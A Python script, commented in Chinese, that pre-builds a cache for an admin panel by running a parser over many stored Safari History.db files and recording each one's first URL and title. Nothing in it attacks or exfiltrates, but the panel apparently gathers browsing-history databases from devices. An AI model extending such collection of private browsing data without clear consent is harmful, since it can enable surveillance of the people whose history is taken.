#!/usr/bin/env python3
# 离线预热 browser_history 解析缓存（避免面板首次请求付 ~55s 同步解析代价）
import json, os, subprocess, time, sys
BASE = '/www/wwwroot/i.131422.com'
V = open(f'{BASE}/adm888app/data/snapshot/POINTER').read().strip()
feed = json.load(open(f'{BASE}/adm888app/data/snapshot/{V}/feeds/browserHistory.json'))
CACHE = f'{BASE}/adm888app/data/browser_parse_cache.json'
cache = {}
try:
    cache = json.load(open(CACHE)) or {}
except Exception:
    pass
# 【复审修复 L1】与服务端一致：缓存键带解析器版本前缀
BH_VER = 'p1|'
need = sorted({x.get('bin_path') for x in feed
               if x.get('exid') and x.get('bin_path') and not x.get('url')
               and (BH_VER + x.get('bin_path')) not in cache})
print(f'待解析 {len(need)} 个库文件（已有缓存 {len(cache)} 条）', flush=True)
ok = fail = 0
t0 = time.time()
for i, bp in enumerate(need):
    try:
        out = subprocess.run(['/usr/bin/python3', f'{BASE}/adm888app/parse18.py', bp, 'safari'],
                             capture_output=True, timeout=20)
        d = json.loads(out.stdout.decode() or '{}')
        rows = d.get('rows') or []
        rec = {'url': '', 'title': '', 'note': '', 'ts': int(time.time() * 1000)}
        if rows:
            rec['url'] = rows[0].get('url') or rows[0].get('history_url') or ''
            rec['title'] = rows[0].get('title') or rows[0].get('page_title') or ''
            rec['note'] = '解析表 ' + str(d.get('table') or '') + f' {len(rows)} 行'
        elif d.get('ok') and (d.get('file') or {}).get('is_sqlite'):
            fn = (d['file'].get('origin_path') or 'History.db').split('/')[-1]
            rec['note'] = f'库为空（{fn} 无记录；WebView 打开不写入 Safari 历史）'
        cache[BH_VER + bp] = rec
        ok += 1
    except Exception:
        fail += 1
    if (i + 1) % 50 == 0:
        print(f'  {i+1}/{len(need)} ok={ok} fail={fail} {time.time()-t0:.0f}s', flush=True)
tmp = CACHE + '.tmp'; json.dump(cache, open(tmp, 'w')); os.replace(tmp, CACHE)   # 原子落盘
print(f'完成: ok={ok} fail={fail} 用时 {time.time()-t0:.0f}s 缓存共 {len(cache)} 条 → {CACHE}', flush=True)
